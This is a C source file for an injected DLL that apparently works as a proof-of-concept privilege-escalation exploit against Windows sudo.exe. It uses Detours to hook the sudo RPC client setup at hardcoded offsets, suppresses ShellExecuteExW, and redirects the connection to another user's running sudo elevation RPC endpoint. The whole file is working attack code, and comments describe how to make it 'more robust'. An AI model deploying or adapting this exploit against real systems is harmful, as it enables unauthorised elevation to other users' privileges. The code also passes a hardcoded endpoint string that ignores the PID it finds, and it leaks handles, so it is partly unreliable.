#include <windows.h>
#include <stdio.h>
#include <detours.h>
#include <psapi.h>
#include <Lmcons.h>

struct rust_str {
    unsigned int length;
    unsigned int reserved;
    BYTE* data;
};

const DWORD kClientDoElevationRequestOffset = 0x8ea50;
const DWORD kSetupClientOffset = 0x8e770;
const char* kSudoFile = "sudo.exe";
const char* kSudoRpcFormat = "sudo_elevate_%i";

typedef BOOL(__stdcall* fnShellExec_t)(SHELLEXECUTEINFOW*);
typedef unsigned long long (__fastcall*fnSetupClient_t)(const char *);

fnSetupClient_t OriginalSetupClient = NULL;
char g_CurrentUser[UNLEN];


DWORD FindRunningSudo() {
    DWORD aProcesses[1024], cbNeeded, cProcesses;
    unsigned int i;

    if (!EnumProcesses(aProcesses, sizeof(aProcesses), &cbNeeded))
    {
        return NULL;
    }


    // Calculate how many process identifiers were returned.

    cProcesses = cbNeeded / sizeof(DWORD);

    // Print the name and process identifier for each process.

    for (i = 0; i < cProcesses; i++)
    {
        if (aProcesses[i] != 0)
        {
            HANDLE proccesHandle = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, aProcesses[i]);
            if (NULL != proccesHandle)
            {
                HANDLE hProcessToken = NULL;
                char lpName[260];
                char lpDomain[260];
                if (OpenProcessToken(proccesHandle, TOKEN_QUERY, &hProcessToken)) {
                    DWORD dwSize = 128;
                    PTOKEN_USER ptu = (TOKEN_USER*)LocalAlloc(LMEM_FIXED, dwSize);
                    if (GetTokenInformation(hProcessToken, TokenUser, ptu, dwSize, &dwSize)) {
                        SID_NAME_USE SidType;
                        if (LookupAccountSid(NULL, ptu->User.Sid, lpName, &dwSize, lpDomain, &dwSize, &SidType)) {
                            if (strcmp(lpName, g_CurrentUser) == 0) {
                                continue;
                            }
                        }
                    }
                }

                char szProcessName[MAX_PATH] = "<unknown>";
                DWORD dwLen = MAX_PATH;
                QueryFullProcessImageNameA(proccesHandle, 0, szProcessName, &dwLen);
                if (strcmp(szProcessName, "C:\\Windows\\System32\\sudo.exe") == 0) {
                    printf("Found target sudo proccess %i\n", aProcesses[i]);
                    return aProcesses[i];
                }
            }
        }
    }
    return NULL;
}

unsigned long long __fastcall HookedSetupClient(char *rpc_port_name) {
    // Specify an open RPC port.
    // The easiest way to reproduce this is to use windbg to hold the RPC socket open.
    // A more robust exploit would brute force this, either by just trying all valid PIDs
    // for the numbers or by enumerating running sudo.exe processes for other users using createtoolhelp32snapshot
    char target_rpc_object[260];
    OutputDebugStringA("Finding target PID...\n");
    DWORD target_pid = FindRunningSudo();
    while (target_pid == NULL) {
        target_pid = FindRunningSudo();
    }
    snprintf(target_rpc_object, 260, kSudoRpcFormat, target_pid);
    OutputDebugStringA(target_rpc_object);
    return OriginalSetupClient("sudo_elevate_9868\n");
}

BOOL HookedShellExecuteExW(SHELLEXECUTEINFOW* pExecInfo) {
    OutputDebugStringA("Not running shell exec...\n");
    return TRUE;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved) {
    if (DetourIsHelperProcess()) {
        return TRUE;
    }

    DWORD szCurrentUserLen = UNLEN;
    GetUserName(g_CurrentUser, &szCurrentUserLen);

    if (dwReason == DLL_PROCESS_ATTACH) {
        HMODULE target_process_handle = GetModuleHandle(NULL);
        char* debugOutput = (char*)malloc(256);
        snprintf(debugOutput, 256, "Got Module Handle %p\n", (void*)target_process_handle);
        OutputDebugStringA(debugOutput);
        OriginalSetupClient = (fnSetupClient_t)((unsigned long long)target_process_handle + kSetupClientOffset);
        snprintf(debugOutput, 256, "Attaching the hook to function at %p\n", (void*)OriginalSetupClient);
        OutputDebugStringA(debugOutput);

        HMODULE hShell32 = GetModuleHandleA("Shell32");
        snprintf(debugOutput, 256, "Got Shell32 Handle %p\n", (void*)hShell32);
        OutputDebugStringA(debugOutput);
        if (hShell32 == NULL) {
            free(debugOutput);
            return FALSE;
        }
        void* pShellExecuteExW = GetProcAddress(hShell32, "ShellExecuteExW");
        snprintf(debugOutput, 256, "ShellExec target fp %p\n", (void*)pShellExecuteExW);
        OutputDebugStringA(debugOutput);

        DetourRestoreAfterWith();
        DetourTransactionBegin();
        DetourUpdateThread(GetCurrentThread());
        DetourAttach(&(PVOID&)OriginalSetupClient, HookedSetupClient);
        DetourAttach(&(PVOID&)pShellExecuteExW, HookedShellExecuteExW);
        DetourTransactionCommit();
        snprintf(debugOutput, 256, "Hooked function at %p\n", (void*)HookedSetupClient);
        OutputDebugStringA(debugOutput);
        free(debugOutput);
    }
    else if (dwReason == DLL_PROCESS_DETACH) {
        HMODULE target_process_handle = GetModuleHandle(NULL);
        OriginalSetupClient = (fnSetupClient_t)GetProcAddress(target_process_handle, "SetupClient");
        DetourTransactionBegin();
        DetourUpdateThread(GetCurrentThread());
        DetourDetach(&(PVOID&)OriginalSetupClient, HookedSetupClient);
        DetourTransactionCommit();
    }
    return TRUE;
}
